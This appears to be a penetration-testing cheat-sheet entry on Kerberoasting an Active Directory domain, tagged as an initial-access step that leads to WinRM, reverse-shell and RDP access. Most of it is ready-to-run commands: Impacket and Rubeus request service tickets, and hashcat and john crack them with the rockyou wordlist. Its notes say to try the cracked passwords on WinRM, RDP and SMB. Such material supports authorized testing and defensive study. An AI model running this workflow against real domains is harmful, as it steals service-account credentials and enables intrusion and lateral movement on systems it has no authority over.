---
id: kerberoast
title: Kerberoasting
stage: initial-access
tags: [windows, ad]
tools:
  - impacket-GetUserSPNs $DOMAIN/user:password -dc-ip $DC_IP -request -outputfile kerberoast.txt
  - hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt
leads_to:
  - winrm
  - rev-shell
  - rdp-access
---

## Request TGS Tickets

```bash
# From Linux (requires valid domain creds)
impacket-GetUserSPNs $DOMAIN/user:password -dc-ip $DC_IP -request -outputfile kerberoast.txt

# From Windows (Rubeus)
.\Rubeus.exe kerberoast /outfile:kerberoast.txt
```

## Crack

```bash
hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt
hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
john --wordlist=/usr/share/wordlists/rockyou.txt kerberoast.txt
```

## Notes

Requires at least one set of valid domain credentials (any user). Unlike AS-REP roasting, Kerberoasting targets service accounts with SPNs — these often have weak passwords set by admins.

Hash type `13100` = `$krb5tgs$23$*...`. Cracked password → try against WinRM, RDP, SMB.
